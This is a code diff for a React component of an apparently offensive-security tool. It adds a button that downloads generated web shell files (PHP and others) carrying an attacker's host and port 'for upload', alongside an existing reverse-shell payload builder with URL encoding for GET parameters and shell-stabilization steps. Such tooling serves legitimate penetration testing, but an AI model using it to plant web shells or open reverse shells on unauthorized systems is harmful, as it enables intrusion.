@@ -1,6 +1,7 @@
 import { useState } from "react";
 import {
-  SHELL_PAYLOAD_KINDS, buildReverseShellPayload, type ShellPayloadKind,
+  SHELL_PAYLOAD_KINDS, WEBSHELL_FILE_KINDS, buildReverseShellPayload,
+  buildWebshellFile, type ShellPayloadKind, type WebshellFileKind,
 } from "./reverseShellPayloads";
 
 // A raw nc/webshell reverse shell has no job control, no tab completion,
@@ -26,11 +27,25 @@ export default function ReverseShellPanel({ onStartListener }: {
   const [lport, setLport] = useState("443");
   const [kind, setKind] = useState<ShellPayloadKind>("nc-mkfifo");
   const [urlEncode, setUrlEncode] = useState(false);
+  const [webshellKind, setWebshellKind] = useState<WebshellFileKind>("php");
 
   const payload = lhost.trim() && lport.trim()
     ? buildReverseShellPayload(kind, lhost.trim(), lport.trim())
     : "";
   const display = urlEncode ? encodeURIComponent(payload) : payload;
+
+  const downloadWebshell = () => {
+    if (!lhost.trim() || !lport.trim()) return;
+    const meta = WEBSHELL_FILE_KINDS.find((item) => item.id === webshellKind);
+    if (!meta) return;
+    const blob = new Blob(
+      [buildWebshellFile(webshellKind, lhost.trim(), lport.trim())],
+      { type: "text/plain" });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url; a.download = meta.filename; a.click();
+    URL.revokeObjectURL(url);
+  };
 
   return (
     <section className="netexecCredCheck" aria-labelledby="revshell-heading">
@@ -58,6 +73,18 @@ export default function ReverseShellPanel({ onStartListener }: {
         URL 인코딩 (GET 파라미터에 바로 붙여넣기용)
       </label>
       {payload && <code className="revshellPayload">{display}</code>}
+      <div className="netexecCredForm">
+        <select value={webshellKind}
+          onChange={(e) => setWebshellKind(e.target.value as WebshellFileKind)}
+          aria-label="웹셸 파일 종류">
+          {WEBSHELL_FILE_KINDS.map((item) => (
+            <option key={item.id} value={item.id}>{item.label} 웹셸 파일</option>
+          ))}
+        </select>
+        <button disabled={!lhost.trim() || !lport.trim()} onClick={downloadWebshell}>
+          업로드용 파일로 다운로드
+        </button>
+      </div>
       <details className="revshellStabilize">
         <summary>쉘 안정화 (Ctrl+C에도 안 죽게, 탭 완성·job control 살리기)</summary>
         <code className="revshellPayload">{STABILIZE_STEPS.join("\n")}</code>
